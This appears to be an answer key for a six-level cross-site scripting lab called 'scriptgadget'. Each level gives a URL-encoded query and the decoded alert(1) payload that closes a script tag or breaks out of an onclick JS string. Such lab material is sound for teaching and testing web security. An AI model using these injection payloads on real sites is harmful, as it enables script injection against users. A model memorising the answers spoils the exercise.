# scriptgadget — solutions

Reflections inside `<script>` JS literals or event-handler attrs; closing the script tag (or breaking the JS string) yields XSS.

### scriptgadget-level1

`/scriptgadget/level1/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JS object property value; close script tag

### scriptgadget-level2

`/scriptgadget/level2/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JS ternary string; close script tag

### scriptgadget-level3

`/scriptgadget/level3/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JS string concat; close script tag

### scriptgadget-level4

`/scriptgadget/level4/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JS function call arg; close script tag

### scriptgadget-level5

`/scriptgadget/level5/?query=')%3Balert(1)%3B//`

- payload: `');alert(1);//`
- context: inside `onclick="handle('...')"`; angle brackets stripped, break out of JS string

### scriptgadget-level6

`/scriptgadget/level6/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JS template literal; close script tag
